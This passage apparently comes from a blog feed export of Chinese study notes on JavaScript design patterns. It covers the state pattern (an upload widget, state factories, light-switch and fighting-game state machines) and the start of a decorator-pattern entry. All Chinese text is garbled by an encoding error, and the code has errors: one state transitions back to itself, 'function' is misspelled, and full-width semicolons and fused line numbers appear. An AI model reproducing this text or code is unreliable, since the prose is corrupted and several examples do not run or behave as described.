ç¬¬å››æ­¥ï¼Œè´Ÿè´£å…·ä½“çš„æŒ‰é’®äº‹ä»¶å®žçŽ°ï¼Œåœ¨ç‚¹å‡»äº†æŒ‰é’®ä¹‹åŽï¼ŒContext å¹¶ä¸åšä»»ä½•å…·ä½“çš„æ“ä½œï¼Œè€Œæ˜¯æŠŠè¯·æ±‚å§”æ‰˜ç»™å½“å‰çš„çŠ¶æ€ç±»æ¥æ‰§è¡Œï¼š 12345678910111213141516171819202122232425262728293031323334353637Upload.prototype.bindEvent = function()&#123; const self = this; this.button1.onclick = function()&#123; self.currState.clickHandler1(); &#125; this.button2.onclick = function()&#123; self.currState.clickHandler2(); &#125; &#125;// æŠŠçŠ¶æ€å¯¹åº”çš„é€»è¾‘è¡Œä¸ºæ”¾åœ¨ Upload ç±»ä¸­Upload.prototype.sign = function()&#123; this.plugin.sign(); this.currState = this.signState;&#125;Upload.prototype.uploading = function()&#123; this.button1.innerHTML = 'æ­£åœ¨ä¸Šä¼ ï¼Œç‚¹å‡»æš‚åœ'; this.plugin.uploading(); this.currState = this.uploadingState;&#125; Upload.prototype.done = function()&#123; this.button1.innerHTML = 'ä¸Šä¼ å®Œæˆ'; this.plugin.done(); this.currState = this.doneState; &#125;; Upload.prototype.pause = function()&#123; this.button1.innerHTML = 'å·²æš‚åœï¼Œç‚¹å‡»ç»§ç»­ä¸Šä¼ '; this.plugin.pause(); this.currState = this.pauseState; &#125;Upload.prototype.del = function()&#123; this.plugin.del(); this.dom.parentNode.removeChild(this.dom); &#125; ç¬¬äº”æ­¥ï¼Œå·¥ä½œç•¥æ˜¾ä¹å‘³ï¼Œæˆ‘ä»¬è¦ç¼–å†™å„ä¸ªçŠ¶æ€ç±»çš„å®žçŽ°ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†StateFactoryï¼Œä»Žè€Œé¿å…å› ä¸º JavaScript ä¸­æ²¡æœ‰æŠ½è±¡ç±»æ‰€å¸¦æ¥çš„é—®é¢˜ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const StateFactory = (function()&#123; const State = function()&#123;&#125;; State.prototype.clickHandler1 = function()&#123; throw new Error('å­ç±»å¿…é¡»é‡å†™çˆ¶ç±»çš„ clickHandler1 æ–¹æ³•'); &#125; State.prototype.clickHandler2 = function()&#123; throw new Error('å­ç±»å¿…é¡»é‡å†™çˆ¶ç±»çš„ clickHandler2 æ–¹æ³•'); &#125; return function(param)&#123; const F = function(uploadObj)&#123; this.uploadObj = uploadObj; &#125; F.prototype = new State(); for(let i in param)&#123; F.prototype[i] = param[i]; &#125; return F; &#125; &#125;)(); const SignState = StateFactory(&#123; clickHandler1:function()&#123; console.log('æ‰«æä¸­ï¼Œç‚¹å‡»æ— æ•ˆ...'); &#125;, clickHandler2:function()&#123; console.log('æ–‡ä»¶æ­£åœ¨ä¸Šä¼ ä¸­ï¼Œä¸èƒ½åˆ é™¤'); &#125;&#125;);const UploadingState = StateFactory(&#123; clickHandler1:function()&#123; this.uploadObj.pause(); &#125;, clickHandler2:function()&#123; console.log('æ–‡ä»¶æ­£åœ¨ä¸Šä¼ ä¸­ï¼Œä¸èƒ½åˆ é™¤'); &#125;&#125;);const PauseState = StateFactory(&#123; clickHandler1:function()&#123; this.uploadObj.uploading(); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;);const DoneState = StateFactory(&#123; clickHandler1:function()&#123; console.log('æ–‡ä»¶å·²å®Œæˆä¸Šä¼ ï¼Œç‚¹å‡»æ— æ•ˆ'); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;); const ErrorState = StateFactory(&#123; clickHandler1:function()&#123; console.log('æ–‡ä»¶ä¸Šä¼ å¤±è´¥'); &#125;, clickHandler2:function()&#123; this.uploadObj.del(); &#125;&#125;); æµ‹è¯•ï¼š 12345678910111213141516const uploadObj = new Upload('JavaScript è®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µ');uploadObj.init();window.external.upload = function(state)&#123; uploadObj[state]();&#125;window.external.upload('sign');setTimeout(function()&#123; window.external.upload('uploading');&#125;,1000);setTimeout(function()&#123; window.external.upload('done');&#125;,5000); ä¼˜ç¼ºç‚¹ çŠ¶æ€æ¨¡å¼å®šä¹‰äº†çŠ¶æ€ä¸Žè¡Œä¸ºä¹‹é—´çš„å…³ç³»ï¼Œå¹¶å°†å®ƒä»¬å°è£…åœ¨ä¸€ä¸ªç±»é‡Œé¢ï¼Œé€šè¿‡å¢žåŠ æ–°çš„çŠ¶æ€ç±»ï¼Œå¾ˆå®¹æ˜“å¢žåŠ æ–°çš„çŠ¶æ€å’Œè½¬æ¢ã€‚ é¿å… Context æ— é™è†¨èƒ€ï¼ŒçŠ¶æ€åˆ‡æ¢çš„é€»è¾‘è¢«åˆ†å¸ƒåœ¨çŠ¶æ€ç±»ä¸­ï¼Œä¹ŸåŽ»æŽ‰äº† Context ä¸­åŽŸæœ¬è¿‡å¤šçš„æ¡ä»¶åˆ†æ”¯ã€‚ ç”¨å¯¹è±¡ä»£æ›¿å­—ç¬¦ä¸²æ¥è®°å½•å½“å‰çŠ¶æ€ï¼Œä½¿å¾—çŠ¶æ€çš„åˆ‡æ¢æ›´åŠ ä¸€ç›®äº†ç„¶ã€‚ Context ä¸­çš„è¯·æ±‚åŠ¨ä½œå’ŒçŠ¶æ€ä¸­å°è£…çš„è¡Œä¸ºå¯ä»¥éžå¸¸å®¹æ˜“åœ°ç‹¬ç«‹å˜åŒ–è€Œäº’ä¸å½±å“ã€‚ çŠ¶æ€æ¨¡å¼çš„ç¼ºç‚¹æ˜¯ä¼šåœ¨ç³»ç»Ÿä¸­å®šä¹‰è®¸å¤šçŠ¶æ€ç±»ï¼Œç¼–å†™20ä¸ªçŠ¶æ€ç±»æ˜¯ä¸€é¡¹æž¯ç‡¥ä¹å‘³çš„å·¥ä½œï¼Œè€Œä¸”ç³»ç»Ÿä¸­ä¼šå› æ­¤è€Œå¢žåŠ ä¸å°‘çš„å¯¹è±¡ï¼Œå¦å¤–ï¼Œç”±äºŽé€»è¾‘åˆ†æ•£åœ¨çŠ¶ç±»ä¸­ï¼Œè™½ç„¶é¿å…äº†ä¸å—æ¬¢è¿Žçš„æ¡ä»¶åˆ†æ”¯è¯­å¥ï¼Œä½†ä¹Ÿé€ æˆäº†é€»è¾‘åˆ†æ•£çš„é—®é¢˜ï¼Œæˆ‘ä»¬æ— æ³•åœ¨ä¸€ä¸ªåœ°æ–¹å°±çœ‹å‡ºæ•´ä¸ªçŠ¶æ€æœºçš„é€»è¾‘ã€‚ æ€§èƒ½ä¼˜åŒ–ç‚¹ä¸Šé¢çš„ï¼›ä¸¤ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å¤ªå¤šåœ°ä»Žæ€§èƒ½æ–¹æ³•è€ƒè™‘é—®é¢˜ï¼Œå®žé™…ä¸Šï¼Œè¿™é‡Œæœ‰ä¸€äº›è¾ƒå¤§çš„ä¼˜åŒ–æ–¹æ¡ˆï¼š æœ‰ä¸¤ç§é€‰æ‹©æ¥ç®¡ç† state å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ã€‚ç¬¬ä¸€ç§æ˜¯ä»…å½“ state å¯¹è±¡è¢«éœ€è¦æ—¶æ‰åˆ›å»ºå¹¶éšåŽé”€æ¯ï¼Œå¦ä¸€ç§æ˜¯å¯ä»¥ä¸€å¼€å§‹å°±åˆ›å»ºæ‰€æœ‰çš„çŠ¶æ€å¯¹è±¡ï¼Œå¹¶ä¸”å§‹ç»ˆä¸é”€æ¯å®ƒä»¬ã€‚å¦‚æžœ state å¯¹è±¡è¿‡äºŽåºžå¤§ï¼Œå¯ä»¥ç”¨ç¬¬ä¸€ç§æ–¹å¼æ¥èŠ‚çœå†…å­˜ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ä¸€äº›ä¸ä¼šç”¨åˆ°çš„å¯¹è±¡å¹¶åŠæ—¶å›žæ”¶å®ƒä»¬ã€‚ä½†å¦‚æžœçŠ¶æ€çš„æ”¹å˜å¾ˆé¢‘ç¹ï¼Œæœ€å¥½ä¸€å¼€å§‹å°±æŠŠè¿™äº› state å¯¹è±¡éƒ½åˆ›å»ºå‡ºæ¥ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦é”€æ¯å®ƒä»¬ï¼Œå› ä¸ºå¯èƒ½å¾ˆå¿«å°±å†æ¬¡ç”¨åˆ°å®ƒä»¬ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸ª Context å¯¹è±¡éƒ½åˆ›å»ºäº†ä¸€ç»„ state å¯¹è±¡ï¼Œå®žé™…ä¸Šè¿™äº› state å¯¹è±¡ä¹‹é—´æ˜¯å¯ä»¥å…±äº«çš„ï¼Œå„ä¸ª Context å¯¹è±¡å¯ä»¥å…±äº«ä¸€ä¸ªstate å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯äº«å…ƒæ¨¡å¼çš„åº”ç”¨ã€‚ å’Œç­–ç•¥æ¨¡å¼çš„å…³ç³»çŠ¶æ€æ¨¡å¼å’Œç­–ç•¥æ¨¡å¼åƒä¸€å¯¹åŒèƒžèƒŽï¼Œå®ƒä»¬éƒ½å°è£…äº†ä¸€ç³»åˆ—çš„ç®—æ³•æˆ–è€…è¡Œä¸ºï¼Œå®ƒä»¬çš„ç±»å›¾çœ‹èµ·æ¥å‡ ä¹Žä¸€æ¨¡ä¸€æ ·ï¼Œä½†åœ¨æ„å›¾ä¸Šæœ‰å¾ˆå¤§ä¸åŒï¼Œå› æ­¤å®ƒä»¬æ˜¯ä¸¤ç§è¿¥ç„¶ä¸åŒçš„æ¨¡å¼ã€‚ ç›¸åŒç‚¹æ˜¯å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªä¸Šä¸‹æ–‡ã€ä¸€äº›ç­–ç•¥ç±»æˆ–è€…çŠ¶æ€ç±»ï¼Œä¸Šä¸‹æ–‡æŠŠè¯·æ±‚å§”æ‰˜ç»™è¿™äº›ç±»æ¥æ‰§è¡Œã€‚ å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«æ˜¯ç­–ç•¥æ¨¡å¼ä¸­çš„å„ä¸ªç­–ç•¥ç±»ä¹‹é—´æ˜¯å¹³ç­‰åˆå¹³è¡Œçš„ï¼Œå®ƒä»¬ä¹‹é—´æ²¡æœ‰ä»»ä½•è”ç³»ï¼Œæ‰€ä»¥å®¢æˆ·å¿…é¡»ç†ŸçŸ¥è¿™äº›ç­–ç•¥ç±»çš„ä½œç”¨ï¼Œä»¥ä¾¿å®¢æˆ·å¯ä»¥ä¸»åŠ¨åˆ‡æ¢ç®—æ³•ï¼Œè€Œåœ¨çŠ¶æ€æ¨¡å¼ä¸­ï¼ŒçŠ¶æ€å’ŒçŠ¶æ€å¯¹åº”çš„è¡Œä¸ºæ—©å·²ç»å°è£…å¥½äº†ï¼ŒçŠ¶æ€ä¹‹é—´çš„åˆ‡æ¢ä¹Ÿæ—©è¢«è§„å®šå¥½äº†ï¼Œæ”¹å˜è¡Œä¸ºè¿™ä»¶äº‹æƒ…å‘ç”Ÿåœ¨çŠ¶æ€æ¨¡å¼çš„å†…éƒ¨ã€‚å¯¹å®¢æˆ·æ¥è¯´ï¼Œå¹¶ä¸éœ€è¦äº†è§£è¿™äº›ç»†èŠ‚ï¼Œè¿™æ­£æ˜¯çŠ¶æ€æ¨¡å¼çš„ä½œç”¨æ‰€åœ¨ã€‚ JavaScript ç‰ˆæœ¬çš„çŠ¶æ€æœºçŠ¶æ€æ¨¡å¼æ˜¯çŠ¶æ€æœºçš„å®žçŽ°ä¹‹ä¸€ï¼Œä½†åœ¨ JavaScript è¿™ç§æ— ç±»çš„è¯­è¨€ä¸­ï¼Œæ²¡æœ‰è§„å®šè®©çŠ¶æ€å¯¹è±¡ä¸€å®šè¦ä»Žç±»ä¸­åˆ›å»ºè€Œæ¥ã€‚å¦å¤–ä¸€ç‚¹ï¼ŒJavaScript å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°ä½¿ç”¨å§”æ‰˜æŠ€æœ¯ï¼Œå¹¶ä¸éœ€è¦å®žçŽ°è®©ä¸€ä¸ªå¯¹è±¡æŒæœ‰å¦ä¸€ä¸ªå¯¹è±¡ã€‚ä¸‹é¢çš„çŠ¶æ€æœºé€‰æ‹©äº†é€šè¿‡ Function.prototype.call æ–¹æ³•ç›´æŽ¥æŠŠè¯·æ±‚å§”æ‰˜ç»™æŸä¸ªå­—é¢é‡å¯¹è±¡æ¥æ‰§è¡Œã€‚ æ”¹å†™ç”µç¯çš„ä¾‹å­ï¼Œæ¥å±•ç¤ºè¿™ç§æ›´åŠ è½»å·§çš„åšæ³•ï¼š 12345678910111213141516171819202122232425262728293031const Light = function()&#123; this.currState = FSM.off; this.button = null;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; button.innerHTML = 'å·²å…³ç¯'ï¼› this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.currState.buttonWasPressed.call(self); &#125;&#125;const FSM = &#123; off:&#123; buttonWasPressed:function()&#123; console.log('å…³ç¯'); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å¼€ç¯'; this.currState = FSM.on; &#125; &#125;, on:&#123; buttonWasPressed:function()&#123; console.log('å¼€ç¯'); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å…³ç¯'; this.currState = FSM.on; &#125; &#125;&#125;const light = new Light();light.init(); åˆ©ç”¨ä¸‹é¢çš„ delegate å‡½æ•°æ¥å®Œæˆè¿™ä¸ªçŠ¶æ€çš„ç¼–å†™ï¼Œè¿™æ˜¯é¢å‘å¯¹è±¡è®¾è®¡å’Œé—­åŒ…äº’æ¢çš„ä¸€ä¸ªä¾‹å­ï¼Œå‰è€…æŠŠå˜é‡ä¿å­˜ä¸ºå¯¹è±¡çš„å±žæ€§ï¼Œè€ŒåŽè€…æŠŠå˜é‡å°é—­åœ¨é—­åŒ…å½¢æˆçš„çŽ¯å¢ƒä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041const delegate = function(client,delegation)&#123; return&#123; buttonWasPressed:function()&#123; return delegation.buttonWasPressed.apply(client,arguments); &#125; &#125;&#125;const FSM = &#123; off: &#123; buttonWasPressed: function()&#123; console.log( 'å…³ç¯' ); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å¼€ç¯'; this.currState = this.onState; &#125; &#125;, on: &#123; buttonWasPressed: function()&#123; console.log( 'å¼€ç¯' ); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å…³ç¯'; this.currState = this.offState; &#125; &#125; &#125;;const Light = function()&#123; this.offState = delegate(this,FSM.off); this.onState = delegate(this,FSM.on); this.currState =this.offState; this.button =null;&#125; Light.prototype.init = funuction()&#123; const button = document.createElement('button'), self = this; button.innerHTML = 'å·²å…³ç¯'ï¼› this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.currState.buttonWasPressed.call(self); &#125; &#125;const light = new Light();light.init(); å®žé™…é¡¹ç›®ä¸­çš„å…¶ä»–çŠ¶æ€æœºåœ¨å®žé™…å¼€å‘ä¸­ï¼Œå¾ˆå¤šåœºæ™¯éƒ½å¯ä»¥ç”¨çŠ¶æ€æœºæ¥æ¨¡æ‹Ÿã€‚æ¯”å¦‚ä¸€ä¸ªä¸‹æ‹‰èœå•åœ¨ hover åŠ¨ä½œä¸‹æœ‰æ˜¾ç¤ºã€æ‚¬æµ®ã€éšè—ç­‰çŠ¶æ€ï¼Œä¸€æ¬¡TCP è¯·æ±‚æœ‰å»ºç«‹è¿žæŽ¥ã€ç›‘å¬ã€å…³é—­ç­‰çŠ¶æ€ï¼Œä¸€ä¸ªæ ¼æ–—æ¸¸æˆä¸­ä»»åŠ¡æœ‰æ”»å‡»ã€é˜²å¾¡ã€è·³è·ƒã€è·Œå€’ç­‰çŠ¶æ€ã€‚ çŠ¶æ€æœºåœ¨æ¸¸æˆå¼€å‘ä¸­ä¹Ÿæœ‰ç€å¹¿æ³›çš„ç”¨é€”ï¼Œç‰¹åˆ«æ˜¯æ¸¸æˆ AI çš„é€»è¾‘ç¼–å†™ï¼ŒHTML5 ç‰ˆè¡—å¤´éœ¸çŽ‹æ¸¸æˆé‡Œï¼Œæ¸¸æˆä¸»è§’ Ryu æœ‰èµ°åŠ¨ã€æ”»å‡»ã€é˜²å¾¡ã€è·Œå€’ã€è·³è·ƒç­‰å¤šç§çŠ¶æ€ã€‚è¿™äº›çŠ¶æ€ä¹‹é—´æ—¢äº’ç›¸è”ç³»åˆäº’ç›¸çº¦æŸã€‚æ¯”å¦‚ Ryu åœ¨èµ°åŠ¨çš„è¿‡ç¨‹ä¸­å¦‚æžœè¢«æ”»å‡»ï¼Œå°±ä¼šç”±èµ°åŠ¨çŠ¶æ€åˆ‡æ¢ä¸ºè·Œå€’çŠ¶æ€ã€‚åœ¨è·Œå€’çŠ¶æ€ä¸‹ï¼ŒRyu æ—¢ä¸èƒ½æ”»å‡»ä¹Ÿä¸èƒ½é˜²å¾¡ã€‚åŒæ ·ï¼ŒRyu ä¹Ÿä¸èƒ½åœ¨è·³è·ƒçš„è¿‡ç¨‹ä¸­åˆ‡æ¢åˆ°é˜²å¾¡çŠ¶æ€ï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚è¿™ç§åœºæ™¯å°±å¾ˆé€‚åˆç”¨çŠ¶æ€æœºæ¥æè¿°ã€‚ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324const FSM = &#123; walk: &#123; attack: function()&#123; console.log( 'æ”»å‡»' ); &#125;, defense: function()&#123; console.log( 'é˜²å¾¡' ); &#125;, jump: function()&#123; console.log( 'è·³è·ƒ' ); &#125; &#125;, attack: &#123; walk: function()&#123; console.log( 'æ”»å‡»çš„æ—¶å€™ä¸èƒ½è¡Œèµ°' ); &#125;, defense: function()&#123; console.log( 'æ”»å‡»çš„æ—¶å€™ä¸èƒ½é˜²å¾¡' ); &#125;, jump: function()&#123; console.log( 'æ”»å‡»çš„æ—¶å€™ä¸èƒ½è·³è·ƒ' ); &#125; &#125; &#125; å°ç»“è®²è§£äº†çŠ¶æ€æ¨¡å¼åœ¨å®žé™…å¼€å‘ä¸­çš„åº”ç”¨ã€‚çŠ¶æ€æ¨¡å¼ä¹Ÿè®¸æ˜¯è¢«å¤§å®¶ä½Žä¼°çš„æ¨¡å¼ä¹‹ä¸€ã€‚å®žé™…ä¸Šï¼Œé€šè¿‡çŠ¶æ€æ¨¡å¼é‡æž„ä»£ç ä¹‹åŽï¼Œå¾ˆå¤šæ‚ä¹±æ— ç« çš„ä»£ç ä¼šå˜å¾—æ›´åŠ æ¸…æ™°ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”è£…é¥°è€…æ¨¡å¼]]></title>
    <url>%2F2019-03-14-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%A3%85%E9%A5%B0%E8%80%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”è£…é¥°è€…æ¨¡å¼åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œè®¸å¤šæ—¶å€™éƒ½å¹¶ä¸å¸Œæœ›æŸä¸ªç±»å¤©ç”Ÿå°±éžå¸¸åºžå¤§ï¼Œä¸€æ¬¡æ€§åŒ…å«è®¸å¤šèŒè´£ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è£…é¥°è€…æ¨¡å¼ã€‚è£…é¥°è€…æ¨¡å¼å¯ä»¥åŠ¨æ€åœ°ç»™æŸä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼Œè€Œä¸ä¼šå½±å“ä»Žè¿™ä¸ªç±»ä¸­æ´¾ç”Ÿçš„å…¶ä»–å¯¹è±¡ã€‚ åœ¨ä¼ ç»Ÿçš„é¢å‘å¯¹è±¡è¯­è¨€ä¸­ï¼Œç»™å¯¹è±¡æ·»åŠ åŠŸèƒ½å¸¸å¸¸ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼ï¼Œä½†æ˜¯ç»§æ‰¿çš„æ–¹å¼å¹¶ä¸çµæ´»ï¼Œè¿˜ä¼šå¸¦æ¥å­¦è¿‡çš„é—®é¢˜ï¼šä¸€æ–¹é¢ä¼šå¯¼è‡´è¶…ç±»å’Œå­ç±»ä¹‹é—´å­˜åœ¨å¼ºè€¦åˆæ€§ï¼Œå½“è¶…ç±»æ”¹å˜çš„æ—¶å€™ï¼Œå­ç±»ä¹Ÿä¼šéšç€æ”¹å˜ï¼Œå¦ä¸€æ–¹é¢ï¼Œç»§æ‰¿è¿™ç§åŠŸèƒ½å¤ç”¨æ–¹å¼é€šå¸¸è¢«ç§°ä¸º â€œç™½ç®±å¤ç”¨â€ï¼Œâ€œç™½ç®±â€æ˜¯ç›¸å¯¹å¯è§æ€§è€Œè¨€çš„ï¼Œåœ¨ç»§æ‰¿æ–¹å¼ä¸­ï¼Œè¶…ç±»çš„å†…éƒ¨ç»†èŠ‚æ˜¯å¯¹å­ç±»å¯è§çš„ï¼Œç»§æ‰¿å¸¸å¸¸è¢«è®¤ä¸ºç ´åäº†å°è£…æ€§ã€‚ ä½¿ç”¨ç»§æ‰¿è¿˜ä¼šå¸¦æ¥å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨å®Œæˆä¸€äº›åŠŸèƒ½å¤ç”¨çš„åŒæ—¶ï¼Œæœ‰å¯èƒ½åˆ›å»ºå‡ºå¤§é‡çš„å­ç±»ï¼Œä½¿å­ç±»çš„æ•°é‡å‘ˆçˆ†ç‚¸æ€§å¢žé•¿ã€‚æ¯”å¦‚çŽ°åœ¨æœ‰ 4 ç§åž‹å·çš„è‡ªè¡Œè½¦ï¼Œæˆ‘ä»¬ä¸ºæ¯ç§è‡ªè¡Œè½¦éƒ½å®šä¹‰äº†ä¸€ä¸ªå•ç‹¬çš„ç±»ã€‚çŽ°åœ¨è¦ç»™æ¯ç§è‡ªè¡Œè½¦éƒ½è£…ä¸Šå‰ç¯ã€å°¾ç¯å’Œé“ƒé“›è¿™ 3 ç§é…ä»¶ã€‚å¦‚æžœä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼æ¥ç»™æ¯ç§è‡ªè¡Œè½¦åˆ›å»ºå­ç±»ï¼Œåˆ™éœ€è¦ 4Ã—3 = 12 ä¸ªå­ç±»ã€‚ä½†æ˜¯å¦‚æžœæŠŠå‰ç¯ã€å°¾ç¯ã€é“ƒé“›è¿™äº›å¯¹è±¡åŠ¨æ€ç»„åˆåˆ°è‡ªè¡Œè½¦ä¸Šé¢ï¼Œåˆ™åªéœ€è¦é¢å¤–å¢žåŠ  3 ä¸ªç±»ã€‚ è¿™ç§ç»™å¯¹è±¡åŠ¨æ€åœ°å¢žåŠ èŒè´£çš„æ–¹å¼ç§°ä¸ºè£…é¥°è€…ï¼ˆdecoratorï¼‰æ¨¡å¼ã€‚è£…é¥°è€…æ¨¡å¼èƒ½å¤Ÿåœ¨ä¸æ”¹å˜å¯¹è±¡è‡ªèº«çš„åŸºç¡€ä¸Šï¼Œåœ¨ç¨‹åºè¿è¡ŒæœŸé—´ç»™å¯¹è±¡åŠ¨æ€åœ°æ·»åŠ èŒè´£ã€‚è·Ÿç»§æ‰¿ç›¸æ¯”ï¼Œè£…é¥°è€…æ˜¯ä¸€æ›´è½»ä¾¿çµæ´»çš„åšæ³•ï¼Œè¿™æ˜¯ä¸€ç§â€œå³ç”¨å³ä»˜â€çš„æ–¹å¼ï¼Œæ¯”å¦‚å¤©å†·äº†å°±å¤šç©¿ä¸€ä»¶å¤–å¥—ï¼Œéœ€è¦é£žè¡Œæ—¶å°±åœ¨å¤´ä¸Šæ’ä¸€æ”¯ç«¹èœ»èœ“ï¼Œé‡åˆ°ä¸€å †é£Ÿå°¸é¬¼æ—¶å°±ç‚¹å¼€ AOEï¼ˆèŒƒå›´æ”»å‡»ï¼‰æŠ€èƒ½ã€‚ æ¨¡æ‹Ÿä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€çš„è£…é¥°è€…æ¨¡å¼é¦–å…ˆè¦æå‡ºæ¥çš„æ˜¯ï¼Œä½œä¸ºä¸€é—¨è§£é‡Šæ‰§è¡Œçš„è¯­è¨€ï¼Œç»™ JavaScript ä¸­çš„å¯¹è±¡åŠ¨æ€æ·»åŠ æˆ–è€…æ”¹å˜èŒè´£æ˜¯ä¸€ä»¶å†ç®€å•ä¸è¿‡çš„äº‹æƒ…ï¼Œè™½ç„¶è¿™ç§åšæ³•æ”¹åŠ¨äº†å¯¹è±¡è‡ªèº«ï¼Œè·Ÿä¼ ç»Ÿå®šä¹‰ä¸­çš„è£…é¥°è€…æ¨¡å¼å¹¶ä¸ä¸€æ ·ï¼Œä½†è¿™æ— ç–‘æ›´ç¬¦åˆ JavaScript çš„è¯­è¨€ç‰¹è‰²ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345var obj = &#123; name:'sevn', address:'æ·±åœ³'&#125;obj.address = obj.address + 'ç¦ç”°åŒº'; ä¼ ç»Ÿé¢å‘å¯¹è±¡è¯­è¨€ä¸­çš„è£…é¥°è€…æ¨¡å¼åœ¨ JavaScript ä¸­é€‚ç”¨çš„åœºæ™¯ä¸å¤šã€‚é€šå¸¸æˆ‘ä»¬å¹¶ä¸å¤§ä»‹æ„æ”¹å˜å¯¹è±¡è‡ªèº«ã€‚ å‡è®¾æˆ‘ä»¬åœ¨ç¼–å†™ä¸€ä¸ªé£žæœºå¤§æˆ˜çš„æ¸¸æˆï¼Œéšç€ç»éªŒçš„å¢žåŠ ï¼Œæˆ‘ä»¬æ“ä½œçš„é£žæœºå¯¹è±¡å¯ä»¥å‡çº§æˆä¸ºæ›´åŠ åŽ‰å®³çš„é£žæœºï¼Œä¸€å¼€å§‹è¿™äº›é£žæœºåªèƒ½å‘å°„æ™®é€šçš„å­å¼¹ï¼Œå‡åˆ°ç¬¬äºŒçº§çš„æ—¶å€™å¯ä»¥å‘å°„å¯¼å¼¹ï¼Œå‡åˆ°ç¬¬ä¸‰çº§çš„æ—¶å€™å¯ä»¥å‘å°„åŽŸå­å¼¹ã€‚ ä»£ç å®žçŽ°ï¼š 12345678910111213141516171819202122232425262728293031const Plane = function()&#123;&#125;;Plane.prototype.fire = function()&#123; console.log('å‘å°„æ™®é€šå­å¼¹');&#125;// ä¸¤ä¸ªè£…é¥°ç±»const MissileDecorator = function(plane)&#123; this.plane = plane;&#125;MissileDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log('å‘å°„å¯¼å¼¹');&#125;const AtomDecorator = function(plane)&#123; this.plane = plane; &#125;AtomDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log('å‘å°„åŽŸå­å¼¹');&#125;// æµ‹è¯•let plane = new Plane();plane = new MissileDecorator(plane);plane = new AtomDecorator(plane);plane.fire();// å‘å°„æ™®é€šå­å¼¹// å‘å°„å¯¼å¼¹// å‘å°„åŽŸå­å¼¹ è¿™ç§ç»™å¯¹è±¡å¢žåŠ èŒè´£çš„æ–¹å¼ï¼Œå¹¶æ²¡æœ‰çœŸæ­£æ”¹å˜å¯¹è±¡è‡ªèº«ï¼Œè€Œæ˜¯å°†å¯¹è±¡æ”¾å…¥å¦ä¸€ä¸ªå¯¹è±¡ä¹‹ä¸­ï¼Œè¿™äº›å¯¹è±¡ä»¥ä¸€æ¡é“¾çš„æ–¹å¼è¿›è¡Œå¼•ç”¨ï¼Œå½¢æˆä¸€ä¸ªèšåˆå¯¹è±¡ã€‚è¿™äº›å¯¹è±¡éƒ½æ‹¥æœ‰ç›¸åŒçš„æŽ¥å£ï¼ˆfire 